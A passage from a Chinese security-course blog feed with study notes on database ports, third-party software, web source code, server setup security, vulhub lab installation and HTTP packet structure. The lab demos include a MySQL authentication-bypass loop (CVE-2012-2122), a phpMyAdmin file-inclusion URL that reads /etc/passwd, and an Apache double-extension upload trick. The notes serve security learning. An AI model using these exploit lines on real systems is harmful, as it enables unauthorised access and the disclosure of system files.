access/mssql</span><br><span class="line">2. 组合类型php + mysql </span><br><span class="line">3. 组合类型aspx+mssql</span><br><span class="line">4. 组合类型jsp +mysql/oracle</span><br><span class="line">5. 组合类型Python + MongoDB</span><br></pre></td></tr></table></figure></li><li>常见的数据库默认端口号</li><li>关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql3306</span><br><span class="line">2. sqlserver1433</span><br><span class="line">3. oracle1521</span><br><span class="line">4. psotgresql5432</span><br></pre></td></tr></table></figure></li><li>非关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. MongoDB27017</span><br><span class="line">2. Redis6379</span><br><span class="line">3. memcached11211</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20145520.png"></li><li>3306端口为MySQL数据库</li><li>其中STATE状态，open表示打开，close是关闭，filtered是拦截，表示nmap无法确定开放状态</li></ul><h2 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h2><ul><li>数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。</li><li>不同的数据库的攻击方式也不完全一样。</li></ul><h2 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h2><ul><li>存在弱口令</li><li>数据库漏洞</li></ul><h2 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h2><ul><li>数据库权限</li><li>网站权限</li><li>修改网页内容</li></ul><h1 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h1><h2 id="如何判断有哪些第三方平台或软件"><a href="#如何判断有哪些第三方平台或软件" class="headerlink" title="如何判断有哪些第三方平台或软件"></a>如何判断有哪些第三方平台或软件</h2><ul><li>通过扫描网站可以看到安装了哪些第三方的软件，例如下面这个就是安装了Apache httpd<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20151155.png"></li></ul><h2 id="简要为什么要识别第三方平台或软件"><a href="#简要为什么要识别第三方平台或软件" class="headerlink" title="简要为什么要识别第三方平台或软件"></a>简要为什么要识别第三方平台或软件</h2><ul><li>不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多</li></ul><h2 id="常见第三方平台或软件漏洞类型及攻击"><a href="#常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="常见第三方平台或软件漏洞类型及攻击"></a>常见第三方平台或软件漏洞类型及攻击</h2><ul><li>弱口令</li><li>软件的漏洞攻击</li></ul><h2 id="简要第三方平台或软件安全测试的范围"><a href="#简要第三方平台或软件安全测试的范围" class="headerlink" title="简要第三方平台或软件安全测试的范围"></a>简要第三方平台或软件安全测试的范围</h2><ul><li>直接获取到软件的权限便于进一步的提权和攻击</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。<strong>所以明确安全测试思路是很重要的！</strong></li><li>要根据它上面提供的服务来选取这个常见的攻击漏洞或者攻击方式</li></ul><h1 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h1><h2 id="演示某数据库弱口令及漏洞演示"><a href="#演示某数据库弱口令及漏洞演示" class="headerlink" title="演示某数据库弱口令及漏洞演示"></a>演示某数据库弱口令及漏洞演示</h2><h3 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h3><ul><li><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a></li><li>首先在Ubuntu搭建漏洞环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164727.png"></li><li>在kali当中对这个数据库进行扫描<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164829.png"></li><li>可以看出MySQL版本为5.5.23，存在这个漏洞<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 1000`; <span class="keyword">do</span> mysql -u root --password=bad -h 192.168.3.39 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li><li>就可以直接进入到MySQL的shell<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20165219.png"></li></ul><h2 id="第三方应用安全漏洞演示"><a href="#第三方应用安全漏洞演示" class="headerlink" title="第三方应用安全漏洞演示"></a>第三方应用安全漏洞演示</h2><h3 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h3><ul><li><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a></li><li>搭建环境</li><li>然后访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20171122.png"></li><li>可见<code>/etc/passwd</code>被读取，说明文件包含漏洞存在</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day04基础入门-WEB源码拓展</title>
      <link href="/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB源码拓展"><a href="#WEB源码拓展" class="headerlink" title="WEB源码拓展"></a>WEB源码拓展</h1><ul><li>WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-31%20142321.png"></li><li>数据库配置文件，后台目录，模版目录，数据库目录等</li><li>ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题，不同的脚本写出来的数据库储存是不一样的，不同脚本所设置的安全漏洞也是不一样的。</li><li>源码功能决定漏洞的类型，社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞，例如电商主要是支付交易内容，论坛主要是用户信息，可以针对这些内容做文章。</li><li>框架就是将一些常用的功能集成到一个框架内，在开发时直接引用。如果时通过框架开发的，我们可以直接寻找框架的漏洞，如果时非框架的话，就需要在代码当中寻找漏洞。</li><li>CMS称为开源程序，CMS的意义就是如果你在网上找不到这个漏洞，你就自己分析，但是网络上如果找得到，就可以直接使用别人分析的漏洞进行测试。</li><li>能够CMS识别的成为开源，网络上找不到源码的通常成为内部的。开源的网站可以在网络上查找他人分析的漏洞，也可以自己分析；内部的则需要自己分析，通过扫描工具等进行分析。</li><li>关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</li><li>总结:关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外，只需要找这个框架的漏洞就可以了），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取!</li><li><a href="https://websec.readthedocs.io/zh/latest/">WEB安全学习笔记</a></li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day03基础入门-搭建安全拓展</title>
      <link href="/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h1><h2 id="常见搭建平台脚本"><a href="#常见搭建平台脚本" class="headerlink" title="常见搭建平台脚本"></a>常见搭建平台脚本</h2><ul><li><code>ASP</code>、<code>PHP</code>、<code>ASPX</code>、<code>JSP</code>、<code>PY</code>、<code>JAVAWEB</code>等环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20194303.png" alt="Windows Server2003 IIS"></li></ul><h2 id="域名IP目录解析安全问题"><a href="#域名IP目录解析安全问题" class="headerlink" title="域名IP目录解析安全问题"></a>域名IP目录解析安全问题</h2><p>通过域名访问，直接进入到网站绝对目录内，通过IP访问，则可能进入到上一级目录，存在安全问题。</p><h2 id="常见文件后缀解析对应安全"><a href="#常见文件后缀解析对应安全" class="headerlink" title="常见文件后缀解析对应安全"></a>常见文件后缀解析对应安全</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20210609.png" alt="后缀解析"><br>不同扩展名对应指定可执行文件路径，可以不同扩展名指定相同可执行文件。但是如果没有指定，那解析时就会出问题。</p><h2 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h2><h3 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211614.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211709.png"><br>通过身份验证限制，需要用户名和密码才能进入站点，不允许匿名访问。</p><h3 id="IP地址和域名限制"><a href="#IP地址和域名限制" class="headerlink" title="IP地址和域名限制"></a>IP地址和域名限制</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20212144.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20213112.png"><br>设置限制IP地址或者域名，以设定访问权限。</p><h2 id="Web后门与用户及文件权限"><a href="#Web后门与用户及文件权限" class="headerlink" title="Web后门与用户及文件权限"></a>Web后门与用户及文件权限</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20214430.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20215034.png"></p><p>匿名登录的用户会出现在列表当中。<br>通过设置权限，可以限制后门访问文件。</p><h2 id="演示实例"><a href="#演示实例" class="headerlink" title="演示实例"></a>演示实例</h2><ul><li>基于中间件的简要识别<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%202158031.png"><br>在审查元素当中，可以看到response headers，在Server中可以判断出是IIS6.0。</li></ul><ul><li>基于中间件的安全漏洞<br>通过查阅资料等，就可以知道这个平台有哪些漏洞。</li><li>基于中间件的靶场使用<br><a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h3 id="演示Apache-HTTPD-多后缀解析漏洞"><a href="#演示Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="演示Apache HTTPD 多后缀解析漏洞"></a>演示Apache HTTPD 多后缀解析漏洞</h3><ul><li>第一步，首先在Ubuntu系统当中<a href="https://m78alien.github.io/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/">安装好docker环境</a>，并下载文件</li><li>第二步，在vulhub网站找到想做的环境，<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a><br>建议先去网站看看漏洞内容的描述，Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212552.png"></li><li>第三步，在Ubuntu终端当中，打开到<code>vulhub-master</code>文件夹，进入到指定的文件路径中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212953.png"></li><li>第四步，搭建环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213201.png"></li><li>第五步，在物理机浏览器中，输入虚拟机的IP地址以打开网站<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213749.png"></li><li>第六步，创建一个文件<code>1.php.jpg</code>，通过notepad++打开，并键入以下内容，电脑将这个文件识别为jpg图片<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>第七步，在网站当中选择该文件，并提交<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214038.png"></li><li>第八步，在网址栏IP后输入&#x2F;uploadfiles&#x2F;1.php.jpg，发现打开的是PHP文件，而非jpg文件，因此可以通过这个方法，造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214218.png"></li><li>第九步，最后键入以下指令，关闭环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214924.png"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu搭建vulhub漏洞靶场</title>
      <link href="/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><a href="https://vulhub.org/">vulhub官网</a><br>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>首先进入root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt install docker</span><br></pre></td></tr></table></figure><p>查看是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225631.png"></p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225946.png"><br>查看pip是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230034.png"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>使用pip安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230320.png"></p><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><p>百度网盘下载：<a href="https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666">https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666</a><br>复制到Ubuntu当中，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230531.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞靶场 </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day02基础入门-数据包拓展</title>
      <link href="/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="数据包拓展"><a href="#数据包拓展" class="headerlink" title="数据包拓展"></a>数据包拓展</h1><h2 id="http-https数据包"><a href="#http-https数据包" class="headerlink" title="http&#x2F;https数据包"></a>http&#x2F;https数据包</h2><h3 id="http协议是什么"><a href="#http协议是什么" class="headerlink" title="http协议是什么"></a>http协议是什么</h3><ol><li>HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</li><li>设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。</li><li>HTTP有多个版本，目前广泛使用的是HTTP&#x2F;1.1版本。</li></ol><h3 id="HTTP原理"><a href="#HTTP原理" class="headerlink" title="HTTP原理"></a>HTTP原理</h3><ol><li>HTTP是一个基于TCP&#x2F;IP通信协议来传递数据的协议，传输的数据类型为HTML文件、图片文件、查询结果等。</li><li>HTTP协议一般用于B&#x2F;S架构（）。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</li></ol><h3 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h3><ol><li>http协议支持客户端&#x2F;服务端模式，也是一种请求&#x2F;响应模式的协议。</li><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有<code>GET</code>、<code>HEAD</code>、<code>POST</code>。</li><li>灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</li><li>无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</li><li>无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</li></ol><h3 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h3><ol><li>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</li><li>URI：Uniform Resource Identifier 统一资源标识符</li><li>URL：Uniform Resource Location 统一资源定位符</li><li>URI 是用来标示一个具体的资源的，我们可以通过 URI 知道一个资源是什么。</li><li>URL 则是用来定位具体的资源的，标示了一个具体的资源位置。互联网上的每个文件都有一个唯一的URL。</li></ol><h3 id="HTTP报文组成"><a href="#HTTP报文组成" class="headerlink" title="HTTP报文组成"></a>HTTP报文组成</h3><ol><li>请求行：包括请求方法、URL、协议&#x2F;版本</li><li>请求头(Request Header)</li><li>请求正文</li></ol><h3 id="http通信过程"><a href="#http通信过程" class="headerlink" title="http通信过程"></a>http通信过程</h3><p>建立连接—&gt;发送请求数据包—&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与web服务器之间的连接</p><ol><li>浏览器建立与web服务器之间的连接</li><li>浏览器将请求数据打包（生成请求数据包）并发送到web服务器</li><li>web服务器将处理结果打包（生成响应数据包）并发送给浏览器</li><li>web服务器关闭连接</li></ol><h3 id="https传输数据流程"><a href="#https传输数据流程" class="headerlink" title="https传输数据流程"></a>https传输数据流程</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20163111.png" alt="https传输数据流程"></p><ol><li>首先客户端通过URL访问服务器建立SSL连接。</li><li>服务端收到客户端请求后，会将网站支持的证书信息（证书中包含公钥）传送一份给客户端。</li><li>客户端的服务器开始协商SSL连接的安全等级，也就是信息加密的等级。</li><li>客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</li><li>服务器利用自己的私钥解密出会话密钥。</li><li>服务器利用会话密钥加密与客户端之间的通信。</li></ol><h2 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a>Request请求数据包数据格式</h2><ol><li>请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</li><li>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</li><li>空行：请求头与请求体之间用一个空行隔开</li><li>请求体：要发送的数据（一般post提交会使用）；例：<code>user=123&amp;pass=123</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">GET / HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3; timezone=8 </span><br><span class="line">Host: xiaodi8.com </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br></pre></td></tr></table></figure></li></ol><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><ol><li>HTTP 规划定义了 8 种可能的请求方法：<ul><li>GET：检索 URL 中标识资源的一个简单请求  </li><li>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档  </li><li>POST：服务器接受被写入客户端输出流中的数据的请求  </li><li>PUT：服务器保存请求数据作为指定 URL 新内容的请求  </li><li>DELETE：服务器删除 URL 中命令的资源的请求  </li><li>OPTIONS：关于服务器支持的请求方法信息的请求  </li><li>TRACE：web 服务器反馈 Http 请求和其头标的请求  </li><li>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</li></ul></li></ol><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><ol><li>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。  <ul><li>HOST: 主机或域名地址  </li><li>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。  </li><li>User-Agent：是客户浏览器名称  </li><li>Host：对应网址 URL 中的 Web 名称和端口号。  </li><li>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。  </li><li>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接  </li><li>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。  </li><li>Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 &#x2F;icconcept&#x2F;index.jsp中 点 击 一 个 链 接 到 网 页&#x2F;icwork&#x2F;search ， 在 向 服 务 器 发 送 的 GET&#x2F;icwork&#x2F;search 中 的 请 求 中 ， Referer 是<a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。  </li><li>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。  </li><li>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.  </li><li>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 